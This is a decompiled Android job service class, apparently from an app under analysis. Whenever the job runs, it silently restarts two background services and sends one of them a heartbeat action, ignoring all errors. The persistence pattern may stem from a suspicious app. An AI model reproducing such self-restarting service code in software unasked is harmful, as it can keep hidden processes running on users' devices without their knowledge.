/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.job.JobParameters
 *  android.app.job.JobService
 *  android.content.Intent
 *  android.os.Build$VERSION
 */
package linker.resourcer.encoder;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;
import android.os.Build;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.SystemUtilities;

public class WorkSchedulerJobService
extends JobService {
    private static final String TAG = "WorkSchedulerJobService";

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public boolean onStartJob(JobParameters jobParameters) {
        try {
            jobParameters = new Intent(this.getApplicationContext(), SetupOrchestrationService.class);
            if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), SetupOrchestrationService.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService((Intent)jobParameters);
                } else {
                    this.startService((Intent)jobParameters);
                }
            }
            if (!SystemUtilities.isServiceRunning(this.getApplicationContext(), WorkerService.class)) {
                jobParameters = new Intent(this.getApplicationContext(), WorkerService.class);
                if (Build.VERSION.SDK_INT >= 26) {
                    this.startForegroundService((Intent)jobParameters);
                    return false;
                }
                this.startService((Intent)jobParameters);
                return false;
            }
        }
        catch (Exception exception) {
            // empty catch block
            return false;
        }
        try {
            jobParameters = new Intent(this.getApplicationContext(), WorkerService.class);
            jobParameters.setAction("HB");
            this.startService((Intent)jobParameters);
            return false;
        }
        catch (Exception exception) {
            return false;
        }
    }

    public boolean onStopJob(JobParameters jobParameters) {
        return true;
    }
}

